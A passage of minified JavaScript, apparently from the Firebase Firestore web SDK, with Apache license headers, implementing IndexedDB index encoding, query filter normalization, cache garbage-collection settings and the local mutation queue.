 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class gs{constructor(){}_e(e,t){this.we(e,t),t.me()}we(e,t){if("nullValue"in e)this.ge(t,5);else if("booleanValue"in e)this.ge(t,10),t.ye(e.booleanValue?1:0);else if("integerValue"in e)this.ge(t,15),t.ye(ut(e.integerValue));else if("doubleValue"in e){const n=ut(e.doubleValue);isNaN(n)?this.ge(t,13):(this.ge(t,15),su(n)?t.ye(0):t.ye(n))}else if("timestampValue"in e){const n=e.timestampValue;this.ge(t,20),"string"==typeof n?t.pe(n):(t.pe(`${n.seconds||""}`),t.ye(n.nanos||0))}else if("stringValue"in e)this.Ie(e.stringValue,t),this.Te(t);else if("bytesValue"in e)this.ge(t,30),t.Ee(Fi(e.bytesValue)),this.Te(t);else if("referenceValue"in e)this.Ae(e.referenceValue,t);else if("geoPointValue"in e){const n=e.geoPointValue;this.ge(t,45),t.ye(n.latitude||0),t.ye(n.longitude||0)}else"mapValue"in e?ox(e)?this.ge(t,Number.MAX_SAFE_INTEGER):(this.Re(e.mapValue,t),this.Te(t)):"arrayValue"in e?(this.ve(e.arrayValue,t),this.Te(t)):G()}Ie(e,t){this.ge(t,25),this.Pe(e,t)}Pe(e,t){t.pe(e)}Re(e,t){const n=e.fields||{};this.ge(t,55);for(const e of Object.keys(n))this.Ie(e,t),this.we(n[e],t)}ve(e,t){const n=e.values||[];this.ge(t,50);for(const e of n)this.we(e,t)}Ae(e,t){this.ge(t,37),B.fromName(e).path.forEach((e=>{this.ge(t,60),this.Pe(e,t)}))}ge(e,t){e.ye(t)}Te(e){e.ye(2)}}function lL(e){if(0===e)return 8;let t=0;return!(e>>4)&&(t+=4,e<<=4),!(e>>6)&&(t+=2,e<<=2),!(e>>7)&&(t+=1),t}function mS(e){const t=64-function(e){let t=0;for(let n=0;n<8;++n){const r=lL(255&e[n]);if(t+=r,8!==r)break}return t}(e);return Math.ceil(t/8)}gs.be=new gs;class uL{constructor(){this.buffer=new Uint8Array(1024),this.position=0}Ve(e){const t=e[Symbol.iterator]();let n=t.next();for(;!n.done;)this.Se(n.value),n=t.next();this.De()}Ce(e){const t=e[Symbol.iterator]();let n=t.next();for(;!n.done;)this.xe(n.value),n=t.next();this.Ne()}ke(e){for(const t of e){const e=t.charCodeAt(0);if(e<128)this.Se(e);else if(e<2048)this.Se(960|e>>>6),this.Se(128|63&e);else if(t<"\ud800"||"\udbff"<t)this.Se(480|e>>>12),this.Se(128|63&e>>>6),this.Se(128|63&e);else{const e=t.codePointAt(0);this.Se(240|e>>>18),this.Se(128|63&e>>>12),this.Se(128|63&e>>>6),this.Se(128|63&e)}}this.De()}Me(e){for(const t of e){const e=t.charCodeAt(0);if(e<128)this.xe(e);else if(e<2048)this.xe(960|e>>>6),this.xe(128|63&e);else if(t<"\ud800"||"\udbff"<t)this.xe(480|e>>>12),this.xe(128|63&e>>>6),this.xe(128|63&e);else{const e=t.codePointAt(0);this.xe(240|e>>>18),this.xe(128|63&e>>>12),this.xe(128|63&e>>>6),this.xe(128|63&e)}}this.Ne()}Oe(e){const t=this.$e(e),n=mS(t);this.Fe(1+n),this.buffer[this.position++]=255&n;for(let e=t.length-n;e<t.length;++e)this.buffer[this.position++]=255&t[e]}Be(e){const t=this.$e(e),n=mS(t);this.Fe(1+n),this.buffer[this.position++]=~(255&n);for(let e=t.length-n;e<t.length;++e)this.buffer[this.position++]=~(255&t[e])}Le(){this.qe(255),this.qe(255)}Ue(){this.Ke(255),this.Ke(255)}reset(){this.position=0}seed(e){this.Fe(e.length),this.buffer.set(e,this.position),this.position+=e.length}Ge(){return this.buffer.slice(0,this.position)}$e(e){const t=function(e){const t=new DataView(new ArrayBuffer(8));return t.setFloat64(0,e,!1),new Uint8Array(t.buffer)}(e),n=0!=(128&t[0]);t[0]^=n?255:128;for(let e=1;e<t.length;++e)t[e]^=n?255:0;return t}Se(e){const t=255&e;0===t?(this.qe(0),this.qe(255)):255===t?(this.qe(255),this.qe(0)):this.qe(t)}xe(e){const t=255&e;0===t?(this.Ke(0),this.Ke(255)):255===t?(this.Ke(255),this.Ke(0)):this.Ke(e)}De(){this.qe(0),this.qe(1)}Ne(){this.Ke(0),this.Ke(1)}qe(e){this.Fe(1),this.buffer[this.position++]=e}Ke(e){this.Fe(1),this.buffer[this.position++]=~e}Fe(e){const t=e+this.position;if(t<=this.buffer.length)return;let n=2*this.buffer.length;n<t&&(n=t);const r=new Uint8Array(n);r.set(this.buffer),this.buffer=r}}class cL{constructor(e){this.Qe=e}Ee(e){this.Qe.Ve(e)}pe(e){this.Qe.ke(e)}ye(e){this.Qe.Oe(e)}me(){this.Qe.Le()}}class hL{constructor(e){this.Qe=e}Ee(e){this.Qe.Ce(e)}pe(e){this.Qe.Me(e)}ye(e){this.Qe.Be(e)}me(){this.Qe.Ue()}}class Ja{constructor(){this.Qe=new uL,this.je=new cL(this.Qe),this.ze=new hL(this.Qe)}seed(e){this.Qe.seed(e)}We(e){return 0===e?this.je:this.ze}Ge(){return this.Qe.Ge()}reset(){this.Qe.reset()}}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ys{constructor(e,t,n,r){this.indexId=e,this.documentKey=t,this.arrayValue=n,this.directionalValue=r}He(){const e=this.directionalValue.length,t=0===e||255===this.directionalValue[e-1]?e+1:e,n=new Uint8Array(t);return n.set(this.directionalValue,0),t!==e?n.set([0],this.directionalValue.length):++n[n.length-1],new ys(this.indexId,this.documentKey,this.arrayValue,n)}}function ai(e,t){let n=e.indexId-t.indexId;return 0!==n?n:(n=gS(e.arrayValue,t.arrayValue),0!==n?n:(n=gS(e.directionalValue,t.directionalValue),0!==n?n:B.comparator(e.documentKey,t.documentKey)))}function gS(e,t){for(let n=0;n<e.length&&n<t.length;++n){const r=e[n]-t[n];if(0!==r)return r}return e.length-t.length}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class dL{constructor(e){this.collectionId=null!=e.collectionGroup?e.collectionGroup:e.path.lastSegment(),this.Je=e.orderBy,this.Ye=[];for(const t of e.filters){const e=t;e.isInequality()?this.Xe=e:this.Ye.push(e)}}Ze(e){te(e.collectionGroup===this.collectionId);const t=Xm(e);if(void 0!==t&&!this.tn(t))return!1;const n=ds(e);let r=0,i=0;for(;r<n.length&&this.tn(n[r]);++r);if(r===n.length)return!0;if(void 0!==this.Xe){const e=n[r];if(!this.en(this.Xe,e)||!this.nn(this.Je[i++],e))return!1;++r}for(;r<n.length;++r){const e=n[r];if(i>=this.Je.length||!this.nn(this.Je[i++],e))return!1}return!0}tn(e){for(const t of this.Ye)if(this.en(t,e))return!0;return!1}en(e,t){if(void 0===e||!e.field.isEqual(t.fieldPath))return!1;const n="array-contains"===e.op||"array-contains-any"===e.op;return 2===t.kind===n}nn(e,t){return!!e.field.isEqual(t.fieldPath)&&(0===t.kind&&"asc"===e.dir||1===t.kind&&"desc"===e.dir)}}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Kx(e){var t,n;if(te(e instanceof ye||e instanceof Ae),e instanceof ye){if(e instanceof px){const r=(null===(n=null===(t=e.value.arrayValue)||void 0===t?void 0:t.values)||void 0===n?void 0:n.map((t=>ye.create(e.field,"==",t))))||[];return Ae.create(r,"or")}return e}const r=e.filters.map((e=>Kx(e)));return Ae.create(r,e.op)}function fL(e){if(0===e.getFilters().length)return[];const t=hg(Kx(e));return te(Qx(t)),ug(t)||cg(t)?[t]:t.getFilters()}function ug(e){return e instanceof ye}function cg(e){return e instanceof Ae&&tv(e)}function Qx(e){return ug(e)||cg(e)||function(e){if(e instanceof Ae&&tg(e)){for(const t of e.getFilters())if(!ug(t)&&!cg(t))return!1;return!0}return!1}(e)}function hg(e){if(te(e instanceof ye||e instanceof Ae),e instanceof ye)return e;if(1===e.filters.length)return hg(e.filters[0]);const t=e.filters.map((e=>hg(e)));let n=Ae.create(t,e.op);return n=Zh(n),Qx(n)?n:(te(n instanceof Ae),te(oa(n)),te(n.filters.length>1),n.filters.reduce(((e,t)=>fv(e,t))))}function fv(e,t){let n;return te(e instanceof ye||e instanceof Ae),te(t instanceof ye||t instanceof Ae),n=e instanceof ye?t instanceof ye?(r=e,i=t,Ae.create([r,i],"and")):yS(e,t):t instanceof ye?yS(t,e):function(e,t){if(te(e.filters.length>0&&t.filters.length>0),oa(e)&&oa(t))return hx(e,t.getFilters());const n=tg(e)?e:t,r=tg(e)?t:e,i=n.filters.map((e=>fv(e,r)));return Ae.create(i,"or")}(e,t),Zh(n);var r,i}function yS(e,t){if(oa(t))return hx(t,e.getFilters());{const n=t.filters.map((t=>fv(e,t)));return Ae.create(n,"or")}}function Zh(e){if(te(e instanceof ye||e instanceof Ae),e instanceof ye)return e;const t=e.getFilters();if(1===t.length)return Zh(t[0]);if(ux(e))return e;const n=t.map((e=>Zh(e))),r=[];return n.forEach((t=>{t instanceof ye?r.push(t):t instanceof Ae&&(t.op===e.op?r.push(...t.filters):r.push(t))})),1===r.length?r[0]:Ae.create(r,e.op)}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class pL{constructor(){this.sn=new pv}addToCollectionParentIndex(e,t){return this.sn.add(t),C.resolve()}getCollectionParents(e,t){return C.resolve(this.sn.getEntries(t))}addFieldIndex(e,t){return C.resolve()}deleteFieldIndex(e,t){return C.resolve()}getDocumentsMatchingTarget(e,t){return C.resolve(null)}getIndexType(e,t){return C.resolve(0)}getFieldIndexes(e,t){return C.resolve([])}getNextCollectionGroupToUpdate(e){return C.resolve(null)}getMinOffset(e,t){return C.resolve(An.min())}getMinOffsetFromCollectionGroup(e,t){return C.resolve(An.min())}updateCollectionGroup(e,t,n){return C.resolve()}updateIndexEntries(e,t){return C.resolve()}}class pv{constructor(){this.index={}}add(e){const t=e.lastSegment(),n=e.popLast(),r=this.index[t]||new He(Te.comparator),i=!r.has(n);return this.index[t]=r.add(n),i}has(e){const t=e.lastSegment(),n=e.popLast(),r=this.index[t];return r&&r.has(n)}getEntries(e){return(this.index[e]||new He(Te.comparator)).toArray()}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const bc=new Uint8Array(0);class mL{constructor(e,t){this.user=e,this.databaseId=t,this.rn=new pv,this.on=new Ji((e=>zs(e)),((e,t)=>Pu(e,t))),this.uid=e.uid||""}addToCollectionParentIndex(e,t){if(!this.rn.has(t)){const n=t.lastSegment(),r=t.popLast();e.addOnCommittedListener((()=>{this.rn.add(t)}));const i={collectionId:n,parent:dn(r)};return vS(e).put(i)}return C.resolve()}getCollectionParents(e,t){const n=[],r=IDBKeyRange.bound([t,""],[GT(t),""],!1,!0);return vS(e).j(r).next((e=>{for(const r of e){if(r.collectionId!==t)break;n.push(pr(r.parent))}return n}))}addFieldIndex(e,t){const n=Oc(e),r={indexId:(i=t).indexId,collectionGroup:i.collectionGroup,fields:i.fields.map((e=>[e.fieldPath.canonicalString(),e.kind]))};var i;delete r.indexId;const s=n.add(r);if(t.indexState){const n=el(e);return s.next((e=>{n.put(dS(e,this.user,t.indexState.sequenceNumber,t.indexState.offset))}))}return s.next()}deleteFieldIndex(e,t){const n=Oc(e),r=el(e),i=Za(e);return n.delete(t.indexId).next((()=>r.delete(IDBKeyRange.bound([t.indexId],[t.indexId+1],!1,!0)))).next((()=>i.delete(IDBKeyRange.bound([t.indexId],[t.indexId+1],!1,!0))))}getDocumentsMatchingTarget(e,t){const n=Za(e);let r=!0;const i=new Map;return C.forEach(this.un(t),(t=>this.cn(e,t).next((e=>{r&&(r=!!e),i.set(t,e)})))).next((()=>{if(r){let e=ce();const r=[];return C.forEach(i,((i,s)=>{var o;V("IndexedDbIndexManager",`Using index ${o=i,`id=${o.indexId}|cg=${o.collectionGroup}|f=${o.fields.map((e=>`${e.fieldPath}:${e.kind}`)).join(",")}`} to execute ${zs(t)}`);const a=function(e,t){const n=Xm(t);if(void 0===n)return null;for(const t of Qh(e,n.fieldPath))switch(t.op){case"array-contains-any":return t.value.arrayValue.values||[];case"array-contains":return[t.value]}return null}(s,i),l=function(e,t){const n=new Map;for(const r of ds(t))for(const t of Qh(e,r.fieldPath))switch(t.op){case"==":case"in":n.set(r.fieldPath.canonicalString(),t.value);break;case"not-in":case"!=":return n.set(r.fieldPath.canonicalString(),t.value),Array.from(n.values())}return null}(s,i),u=function(e,t){const n=[];let r=!0;for(const i of ds(t)){const t=0===i.kind?Xw(e,i.fieldPath,e.startAt):Jw(e,i.fieldPath,e.startAt);n.push(t.value),r&&(r=t.inclusive)}return new zi(n,r)}(s,i),c=function(e,t){const n=[];let r=!0;for(const i of ds(t)){const t=0===i.kind?Jw(e,i.fieldPath,e.endAt):Xw(e,i.fieldPath,e.endAt);n.push(t.value),r&&(r=t.inclusive)}return new zi(n,r)}(s,i),h=this.an(i,s,u),d=this.an(i,s,c),f=this.hn(i,s,l),p=this.ln(i.indexId,a,h,u.inclusive,d,c.inclusive,f);return C.forEach(p,(i=>n.H(i,t.limit).next((t=>{t.forEach((t=>{const n=B.fromSegments(t.documentKey);e.has(n)||(e=e.add(n),r.push(n))}))}))))})).next((()=>r))}return C.resolve(null)}))}un(e){let t=this.on.get(e);return t||(t=0===e.filters.length?[e]:fL(Ae.create(e.filters,"and")).map((t=>rg(e.path,e.collectionGroup,e.orderBy,t.getFilters(),e.limit,e.startAt,e.endAt))),this.on.set(e,t),t)}ln(e,t,n,r,i,s,o){const a=(null!=t?t.length:1)*Math.max(n.length,i.length),l=a/(null!=t?t.length:1),u=[];for(let c=0;c<a;++c){const a=t?this.fn(t[c/l]):bc,h=this.dn(e,a,n[c%l],r),d=this._n(e,a,i[c%l],s),f=o.map((t=>this.dn(e,a,t,!0)));u.push(...this.createRange(h,d,f))}return u}dn(e,t,n,r){const i=new ys(e,B.empty(),t,n);return r?i:i.He()}_n(e,t,n,r){const i=new ys(e,B.empty(),t,n);return r?i.He():i}cn(e,t){const n=new dL(t),r=null!=t.collectionGroup?t.collectionGroup:t.path.lastSegment();return this.getFieldIndexes(e,r).next((e=>{let t=null;for(const r of e)n.Ze(r)&&(!t||r.fields.length>t.fields.length)&&(t=r);return t}))}getIndexType(e,t){let n=2;const r=this.un(t);return C.forEach(r,(t=>this.cn(e,t).next((e=>{e?0!==n&&e.fields.length<function(e){let t=new He(gt.comparator),n=!1;for(const r of e.filters)for(const e of r.getFlattenedFilters())e.field.isKeyField()||("array-contains"===e.op||"array-contains-any"===e.op?n=!0:t=t.add(e.field));for(const n of e.orderBy)n.field.isKeyField()||(t=t.add(n.field));return t.size+(n?1:0)}(t)&&(n=1):n=0})))).next((()=>null!==t.limit&&r.length>1&&2===n?1:n))}wn(e,t){const n=new Ja;for(const r of ds(e)){const e=t.data.field(r.fieldPath);if(null==e)return null;const i=n.We(r.kind);gs.be._e(e,i)}return n.Ge()}fn(e){const t=new Ja;return gs.be._e(e,t.We(0)),t.Ge()}mn(e,t){const n=new Ja;return gs.be._e(Us(this.databaseId,t),n.We(function(e){const t=ds(e);return 0===t.length?0:t[t.length-1].kind}(e))),n.Ge()}hn(e,t,n){if(null===n)return[];let r=[];r.push(new Ja);let i=0;for(const s of ds(e)){const e=n[i++];for(const n of r)if(this.gn(t,s.fieldPath)&&lu(e))r=this.yn(r,s,e);else{const t=n.We(s.kind);gs.be._e(e,t)}}return this.pn(r)}an(e,t,n){return this.hn(e,t,n.position)}pn(e){const t=[];for(let n=0;n<e.length;++n)t[n]=e[n].Ge();return t}yn(e,t,n){const r=[...e],i=[];for(const e of n.arrayValue.values||[])for(const n of r){const r=new Ja;r.seed(n.Ge()),gs.be._e(e,r.We(t.kind)),i.push(r)}return i}gn(e,t){return!!e.filters.find((e=>e instanceof ye&&e.field.isEqual(t)&&("in"===e.op||"not-in"===e.op)))}getFieldIndexes(e,t){const n=Oc(e),r=el(e);return(t?n.j("collectionGroupIndex",IDBKeyRange.bound(t,t)):n.j()).next((e=>{const t=[];return C.forEach(e,(e=>r.get([e.indexId,this.uid]).next((n=>{t.push(function(e,t){const n=t?new Hh(t.sequenceNumber,new An(Ys(t.readTime),new B(pr(t.documentKey)),t.largestBatchId)):Hh.empty(),r=e.fields.map((([e,t])=>new X4(gt.fromServerFormat(e),t)));return new HT(e.indexId,e.collectionGroup,r,n)}(e,n))})))).next((()=>t))}))}getNextCollectionGroupToUpdate(e){return this.getFieldIndexes(e).next((e=>0===e.length?null:(e.sort(((e,t)=>{const n=e.indexState.sequenceNumber-t.indexState.sequenceNumber;return 0!==n?n:ue(e.collectionGroup,t.collectionGroup)})),e[0].collectionGroup)))}updateCollectionGroup(e,t,n){const r=Oc(e),i=el(e);return this.In(e).next((e=>r.j("collectionGroupIndex",IDBKeyRange.bound(t,t)).next((t=>C.forEach(t,(t=>i.put(dS(t.indexId,this.user,e,n))))))))}updateIndexEntries(e,t){const n=new Map;return C.forEach(t,((t,r)=>{const i=n.get(t.collectionGroup);return(i?C.resolve(i):this.getFieldIndexes(e,t.collectionGroup)).next((i=>(n.set(t.collectionGroup,i),C.forEach(i,(n=>this.Tn(e,t,n).next((t=>{const i=this.En(r,n);return t.isEqual(i)?C.resolve():this.An(e,r,n,t,i)})))))))}))}Rn(e,t,n,r){return Za(e).put({indexId:r.indexId,uid:this.uid,arrayValue:r.arrayValue,directionalValue:r.directionalValue,orderedDocumentKey:this.mn(n,t.key),documentKey:t.key.path.toArray()})}vn(e,t,n,r){return Za(e).delete([r.indexId,this.uid,r.arrayValue,r.directionalValue,this.mn(n,t.key),t.key.path.toArray()])}Tn(e,t,n){const r=Za(e);let i=new He(ai);return r.X({index:"documentKeyIndex",range:IDBKeyRange.only([n.indexId,this.uid,this.mn(n,t)])},((e,r)=>{i=i.add(new ys(n.indexId,t,r.arrayValue,r.directionalValue))})).next((()=>i))}En(e,t){let n=new He(ai);const r=this.wn(t,e);if(null==r)return n;const i=Xm(t);if(null!=i){const s=e.data.field(i.fieldPath);if(lu(s))for(const i of s.arrayValue.values||[])n=n.add(new ys(t.indexId,e.key,this.fn(i),r))}else n=n.add(new ys(t.indexId,e.key,bc,r));return n}An(e,t,n,r,i){V("IndexedDbIndexManager","Updating index entries for document '%s'",t.key);const s=[];return function(e,t,n,r,i){const s=e.getIterator(),o=t.getIterator();let a=yo(s),l=yo(o);for(;a||l;){let e=!1,t=!1;if(a&&l){const r=n(a,l);r<0?t=!0:r>0&&(e=!0)}else null!=a?t=!0:e=!0;e?(r(l),l=yo(o)):t?(i(a),a=yo(s)):(a=yo(s),l=yo(o))}}(r,i,ai,(r=>{s.push(this.Rn(e,t,n,r))}),(r=>{s.push(this.vn(e,t,n,r))})),C.waitFor(s)}In(e){let t=1;return el(e).X({index:"sequenceNumberIndex",reverse:!0,range:IDBKeyRange.upperBound([this.uid,Number.MAX_SAFE_INTEGER])},((e,n,r)=>{r.done(),t=n.sequenceNumber+1})).next((()=>t))}createRange(e,t,n){n=n.sort(((e,t)=>ai(e,t))).filter(((e,t,n)=>!t||0!==ai(e,n[t-1])));const r=[];r.push(e);for(const i of n){const n=ai(i,e),s=ai(i,t);if(0===n)r[0]=e.He();else if(n>0&&s<0)r.push(i),r.push(i.He());else if(s>0)break}r.push(t);const i=[];for(let e=0;e<r.length;e+=2){if(this.Pn(r[e],r[e+1]))return[];const t=[r[e].indexId,this.uid,r[e].arrayValue,r[e].directionalValue,bc,[]],n=[r[e+1].indexId,this.uid,r[e+1].arrayValue,r[e+1].directionalValue,bc,[]];i.push(IDBKeyRange.bound(t,n))}return i}Pn(e,t){return ai(e,t)>0}getMinOffsetFromCollectionGroup(e,t){return this.getFieldIndexes(e,t).next(wS)}getMinOffset(e,t){return C.mapArray(this.un(t),(t=>this.cn(e,t).next((e=>e||G())))).next(wS)}}function vS(e){return Ft(e,"collectionParents")}function Za(e){return Ft(e,"indexEntries")}function Oc(e){return Ft(e,"indexConfiguration")}function el(e){return Ft(e,"indexState")}function wS(e){te(0!==e.length);let t=e[0].indexState.offset,n=t.largestBatchId;for(let r=1;r<e.length;r++){const i=e[r].indexState.offset;Jy(i,t)<0&&(t=i),n<i.largestBatchId&&(n=i.largestBatchId)}return new An(t.readTime,t.documentKey,n)}
/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const SS={didRun:!1,sequenceNumbersCollected:0,targetsRemoved:0,documentsRemoved:0};class gn{constructor(e,t,n){this.cacheSizeCollectionThreshold=e,this.percentileToCollect=t,this.maximumSequenceNumbersToCollect=n}static withCacheSize(e){return new gn(e,gn.DEFAULT_COLLECTION_PERCENTILE,gn.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Xx(e,t,n){const r=e.store("mutations"),i=e.store("documentMutations"),s=[],o=IDBKeyRange.only(n.batchId);let a=0;const l=r.X({range:o},((e,t,n)=>(a++,n.delete())));s.push(l.next((()=>{te(1===a)})));const u=[];for(const e of n.mutations){const r=ex(t,e.key.path,n.batchId);s.push(i.delete(r)),u.push(e.key)}return C.waitFor(s).next((()=>u))}function ed(e){if(!e)return 0;let t;if(e.document)t=e.document;else if(e.unknownDocument)t=e.unknownDocument;else{if(!e.noDocument)throw G();t=e.noDocument}return JSON.stringify(t).length}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */gn.DEFAULT_COLLECTION_PERCENTILE=10,gn.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT=1e3,gn.DEFAULT=new gn(41943040,gn.DEFAULT_COLLECTION_PERCENTILE,gn.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT),gn.DISABLED=new gn(-1,0,0);class Qd{constructor(e,t,n,r){this.userId=e,this.serializer=t,this.indexManager=n,this.referenceDelegate=r,this.bn={}}static fe(e,t,n,r){te(""!==e.uid);const i=e.isAuthenticated()?e.uid:"";return new Qd(i,t,n,r)}checkEmpty(e){let t=!0;const n=IDBKeyRange.bound([this.userId,Number.NEGATIVE_INFINITY],[this.userId,Number.POSITIVE_INFINITY]);return li(e).X({index:"userMutationsIndex",range:n},((e,n,r)=>{t=!1,r.done()})).next((()=>t))}addMutationBatch(e,t,n,r){const i=_o(e),s=li(e);return s.add({}).next((o=>{te("number"==typeof o);const a=new ov(o,t,n,r),l=function(e,t,n){const r=n.baseMutations.map((t=>hu(e.le,t))),i=n.mutations.map((t=>hu(e.le,t)));return{userId:t,batchId:n.batchId,localWriteTimeMs:n.localWriteTime.toMillis(),baseMutations:r,mutations:i}}(this.serializer,this.userId,a),u=[];let c=new He(((e,t)=>ue(e.canonicalString(),t.canonicalString())));for(const e of r){const t=ex(this.userId,e.key.path,o);c=c.add(e.key.path.popLast()),u.push(s.put(l)),u.push(i.put(t,r$))}return c.forEach((t=>{u.push(this.indexManager.addToCollectionParentIndex(e,t))})),e.addOnCommittedListener((()=>{this.bn[o]=a.keys()})),C.waitFor(u).next((()=>a))}))}lookupMutationBatch(e,t){return li(e).get(t).next((e=>e?(te(e.userId===this.userId),ms(this.serializer,e)):null))}Vn(e,t){return this.bn[t]?C.resolve(this.bn[t]):this.lookupMutationBatch(e,t).next((e=>{if(e){const n=e.keys();return this.bn[t]=n,n}return null}))}getNextMutationBatchAfterBatchId(e,t){const n=t+1,r=IDBKeyRange.lowerBound([this.userId,n]);let i=null;return li(e).X({index:"userMutationsIndex",range:r},((e,t,r)=>{t.userId===this.userId&&(te(t.batchId>=n),i=ms(this.serializer,t)),r.done()})).next((()=>i))}getHighestUnacknowledgedBatchId(e){const t=IDBKeyRange.upperBound([this.userId,Number.POSITIVE_INFINITY]);let n=-1;return li(e).X({index:"userMutationsIndex",range:t,reverse:!0},((e,t,r)=>{n=t.batchId,r.done()})).next((()=>n))}getAllMutationBatches(e){const t=IDBKeyRange.bound([this.userId,-1],[this.userId,Number.POSITIVE_INFINITY]);return li(e).j("userMutationsIndex",t).next((e=>e.map((e=>ms(this.serializer,e)))))}getAllMutationBatchesAffectingDocumentKey(e,t){const n=eh(this.userId,t.path),r=IDBKeyRange.lowerBound(n),i=[];return _o(e).X({range:r},((n,r,s)=>{const[o,a,l]=n,u=pr(a);if(o===this.userId&&t.path.isEqual(u))return li(e).get(l).next((e=>{if(!e)throw G();te(e.userId===this.userId),i.push(ms(this.serializer,e))}));s.done()})).next((()=>i))}getAllMutationBatchesAffectingDocumentKeys(e,t){let n=new He(ue);const r=[];return t.forEach((t=>{const i=eh(this.userId,t.path),s=IDBKeyRange.lowerBound(i),o=_o(e).X({range:s},((e,r,i)=>{const[s,o,a]=e,l=pr(o);s===this.userId&&t.path.isEqual(l)?n=n.add(a):i.done()}));r.push(o)})),C.waitFor(r).next((()=>this.Sn(e,n)))}getAllMutationBatchesAffectingQuery(e,t){const n=t.path,r=n.length+1,i=eh(this.userId,n),s=IDBKeyRange.lowerBound(i);let o=new He(ue);return _o(e).X({range:s},((e,t,i)=>{const[s,a,l]=e,u=pr(a);s===this.userId&&n.isPrefixOf(u)?u.length===r&&(o=o.add(l)):i.done()})).next((()=>this.Sn(e,o)))}Sn(e,t){const n=[],r=[];return t.forEach((t=>{r.push(li(e).get(t).next((e=>{if(null===e)throw G();te(e.userId===this.userId),n.push(ms(this.serializer,e))})))})),C.waitFor(r).next((()=>n))}removeMutationBatch(e,t){return Xx(e.at,this.userId,t).next((n=>(e.addOnCommittedListener((()=>{this.Dn(t.batchId)})),C.forEach(n,(t=>this.referenceDelegate.markPotentiallyOrphaned(e,t))))))}Dn(e){delete this.bn[e]}performConsistencyCheck(e){return this.checkEmpty(e).next((t=>{if(!t)return C.resolve();const n=IDBKeyRange.lowerBound([this.userId]),r=[];return _o(e).X({range:n},((e,t,n)=>{if(e[0]===this.userId){const t=pr(e[1]);r.push(t)}else n.done()})).next((()=>{te(0===r.length)}))}))}containsKey(e,t){return Jx(e,this.userId,t)}Cn(e){return Zx(e).get(this.userId).next((e=>e||{userId:this.userId,lastAcknowledgedBatchId:-1,lastStreamToken:""}))}}function Jx(e,t,n){const r=eh(t,n.path),i=r[1],s=IDBKeyRange.lowerBound(r);let o=!1;return _o(e).X({range:s,Y:!0},((e,n,r)=>{const[s,a,l]=e;s===t&&a===i&&(o=!0),r.done()})).next((()=>o))}function li(e){return Ft(e,"mutations")}function _o(e){return Ft(e,"documentMutations")}function Zx(e){return Ft(e,"mutationQueues")}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
